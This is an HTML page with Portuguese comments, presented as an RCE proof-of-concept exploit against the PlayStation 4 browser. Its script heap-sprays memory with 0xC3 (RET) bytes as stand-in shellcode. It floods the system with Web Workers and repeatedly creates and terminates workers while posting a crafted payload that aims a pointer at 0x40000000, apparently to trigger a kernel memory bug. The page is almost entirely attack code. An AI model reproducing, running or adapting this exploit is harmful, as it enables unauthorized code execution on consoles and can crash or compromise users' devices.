<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 MAGIC RET (RCE PROOF)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; padding: 20px; display: flex; flex-direction: column; justify-content: center; height: 90vh; }
        h1 { font-size: 2.5em; margin-bottom: 20px; border-bottom: 2px solid #0f0; display: inline-block; }
        #status { font-size: 1.5em; border: 2px solid #fff; padding: 20px; background: #111; color: #fff; }
        .danger { background-color: #00f !important; color: #fff !important; animation: pulse 0.5s infinite; }
        @keyframes pulse { 0% {opacity: 1;} 50% {opacity: 0.7;} 100% {opacity: 1;} }
    </style>
</head>
<body>

    <h1>MAGIC RET (0xC3) TEST</h1>
    <div id="status">PREPARANDO SHELLCODE...</div>

    <script>
        const TARGET_LIMIT = 418; 
        const SPRAY_SIZE = 512;
        const TARGET_OFFSET = 384; 
        
        // Endereço alvo (Userland)
        // Little Endian para 0x40000000
        const ADDR_BYTE_3 = 0x40;

        let workers = [];
        let heapSpray = [];
        
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        // 1. PREPARA O "FAKE KERNEL" (Shellcode)
        // Em vez de 0x41 (Lixo), usamos 0xC3 (RET - Retorno)
        // Se o kernel executar isso, ele "volta" para a função anterior e o console sobrevive.
        function prepareUserland() {
            try {
                for(let i=0; i<500; i++) {
                    let arr = new Uint32Array(0x10000); 
                    // 0xC3C3C3C3 = RET RET RET RET
                    arr.fill(0xC3C3C3C3); 
                    heapSpray.push(arr);
                }
                document.getElementById('status').innerText = "SHELLCODE PRONTO (RET). ENCHENDO...";
                startKernelFill();
            } catch(e) {
                document.getElementById('status').innerText = "ERRO DE MEMÓRIA (OOM)";
            }
        }

        // 2. PREPARA O GATILHO
        const payload = new Uint8Array(SPRAY_SIZE);
        payload.fill(0x00); 
        
        // Aponta o Offset 384 para 0x0000000040000000
        payload[TARGET_OFFSET] = 0x00;
        payload[TARGET_OFFSET+1] = 0x00;
        payload[TARGET_OFFSET+2] = 0x00;
        payload[TARGET_OFFSET+3] = 0x40; // 0x40...
        payload[TARGET_OFFSET+4] = 0x00;
        payload[TARGET_OFFSET+5] = 0x00;
        payload[TARGET_OFFSET+6] = 0x00;
        payload[TARGET_OFFSET+7] = 0x00;

        function startKernelFill() {
            let i = setInterval(() => {
                if (workers.length < TARGET_LIMIT) {
                    workers.push(new Worker(url));
                } else {
                    clearInterval(i);
                    document.getElementById('status').innerText = "ESTABILIZANDO (4s)...";
                    setTimeout(attack, 4000);
                }
            }, 30);
        }

        function attack() {
            const st = document.getElementById('status');
            st.innerText = ">>> EXECUTANDO RETORNO MÁGICO <<<";
            st.className = "danger";

            setInterval(() => {
                const w = new Worker(killerUrl);
                w.terminate();
                try {
                    if(workers.length > 0) workers[0].postMessage(payload);
                } catch(e){}
            }, 10);
        }

        setTimeout(prepareUserland, 1000);

    </script>
</body>
</html>
